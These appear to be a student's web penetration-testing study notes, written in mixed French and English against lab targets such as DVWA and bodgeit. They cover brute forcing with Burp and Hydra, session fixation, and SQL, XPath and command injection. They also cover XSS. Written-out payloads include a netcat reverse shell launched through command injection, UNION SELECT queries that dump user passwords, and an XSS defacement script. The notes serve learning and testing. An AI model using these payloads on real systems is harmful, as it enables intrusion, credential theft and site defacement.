# Website penetration testing

## Tables des matière
 - [Whatweb](#Whatweb)
 - [Dirb](#Dirb)
 - [Burp Suite](#Burp-Suite)
 - [Hydra](#Hydra)
 - [Session fixation](#Session-fixation)
 - [Injection attack](#Injection-attack)
 - [XML Injection](#XML-Injection)
 - [XSS Reflected](#XSS-Reflected)
 - [XSS Stored](#XSS-Stored)
 - [Hydra](#Hydra)


### Whatweb

Web scanner (mettre en plus)

### Dirb

Web Content Scanner (mettre en plus)

### Burp Suite

	Brute force a field --> In your POST method packet --> Send to intruder --> Go to intruder 
	--> select the right field in the http request in the Position tab 
	--> select "Sniper" attack type (for brute force one field)
	--> In Payload options, load a file with some words in order to test each of them.
	--> Click on "start attack"

	Brute force somes fields --> In your POST method packet --> Send to intruder --> Go to intruder 
	--> select rights fields in the http request in the Position tab 
	--> select "Clsuter bomb" attack type (for brute force some fields)
	--> In Payload options, select your "payload set" and load a list which match with the right payload. 
	Do that for every payload that you selected.
	--> You can add an option in order see if a revelant string appears in the html request.
	Go to options and add the string in "Grep - Match" 
	--> Click on "start attack"
	
### Hydra  

Brute forcer faster than burpsuite

command -> `hydra <IP_address> http-<method>-post "<path>:<username_name_field> = ^USER^&<password_name_field> = ^PASS^&<submit_name_field> = submit:<field that reconize where is wrong input> -L <path to user list> -P <path to pass list>`

### Session fixation
	
If you send a mail with an url, set another parameter that is `SID` with a number you want. When the victim click on the link and for example, login into a website, you can be able to request the website with the SID that you put into the fake url and enter into the website with the session ID of the victim who already login with his username and password.

### Injection attack

#### *Simple command injection*

Some servers are vulnerable to command injection. You can execute multiple commands separate by `;`.

You can directly connect this vulnerable website to your machine in order to execute command throught your terminal with netcat tool.
		
command on your machine --> `nc -l -v -p <port_you_want_listening_on>`

command --> `nc.traditional -e <path_to_your_bash ?/bin/bash?> <ip_adress_of_your_machine> <port_you_listening_on>` 

#### *Blind command injection*
	
In order to see if the website is vulnerable to command injection, ping 2 machines. See in wireshark if the pings works.

#### *SQL Basics* 
		
Keyword to request te database : `CREATE; SELECT; UPDATE; INSERT; DELETE; DROP;` 
	
#### *SQL Injection*
			
Most Common check for SQL injection is to type `'` in the iput.
	
You can use `#` to skip the last '. --> `2' SELECT 1,2 #'`

In order to see how many columns are in the database, use `ORDER BY` -->  `ORDER BY 1`... `ORDER BY 2`... `ORDER BY 3`... `ORDER BY 4`... 

You can select all of these by tiping `UNION SELECT 1,2,3`...
		
*Database name* : `database()`, user link to the database : `user()`

*Common table in databases* : 
	
			information_schema.schemata --> schema_name (database name)
			information_schema.tables --> table_name --> You must specifie the condition : WHERE table_schema = '<database_name>
			information_schema.columns --> column_name, column_type --> You must specifie the condition : WHERE table_name = '<table_name> 
			
Uses the function Concat() to gather some informations in a request --> `2' UNION SELECT CONCAT(user_id, '-',first_name, ' ', last_name), CONCAT(user, '-', password) FROM dvwa.users #'`

#### *SQL Blind Injection* :

Brute force to find the name of the database... --> Intruder burpsuite.

### XML Injection :

Some XML vulnerability can be discover by the symbol `'` like SQL Injection, if there is no input, you can modify the http sending packet and add a `'` after the option you selected

You can display all the dabase by add --> `')]/*|//*[contains('1','1`
		
##### *Automate XML Injection* : 

xcat : `apt-get install python3-pip; pip3 install xcat;`

### XSS Reflected

You can perform an XSS reflected attack by find this vulnerability in a website and execute some malicious code (or not) and send the link to someone (in order to steal cookies or to hijack a session). 
		
You can see if the web site is vulnerable tiping `<script><run_a_script_or_a_command></script>`. Example : `<script>alert('Hello')</script>`

This attack can be perform on a specific target.

### XSS Stored

XSS Stored attack means that everyone who visits the web site where you find XSS vulnerability will be a victim of your malicious code. It's stored in the web site himself (For example in a forum)

You can run a script which send some informations to your server.

#### *Changing HTML code with XSS* :

	<img src=x onerror="document.body.innerHTML='<title>YOU HAVE BEEN HACKED</title>'">
	
#### *Automate XSS* :

##### **xsser** : detect XSS vulnerabilities 

command : `xsser -u '<ip_adress>' -g '<url>?<parameter1> =XSS&<parameter2> =XSS`... 

example : `xsser -u 'http://192.168.1.17' -g '/bodgeit/search.jsp?q=XSS'`. You must specifie "XSS" on each parameter you want to detect XSS vulnerability.

##### *xsssniper* : detect XSS vulnerabilities
			
command : `python3 xsssniper.py -u <full_url>?<parameter1>=`

example : `python3 xsssniper.py -u http://192.168.1.17/bodgeit/search.jsp?q=`
					
